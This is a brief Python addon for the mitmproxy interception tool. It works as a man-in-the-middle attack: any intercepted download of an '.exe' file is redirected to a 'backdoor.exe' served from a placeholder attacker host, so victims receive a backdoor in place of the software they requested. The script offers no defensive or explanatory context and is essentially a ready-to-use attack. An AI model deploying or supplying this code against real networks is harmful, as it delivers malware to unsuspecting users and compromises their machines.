import mitmproxy

def request(flow):
	if flow.request.host != "***HOST IP***" and flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://***HOST IP***/backdoor.exe"})
		

#def response(flow):
#	print("response....")
#	print(flow)
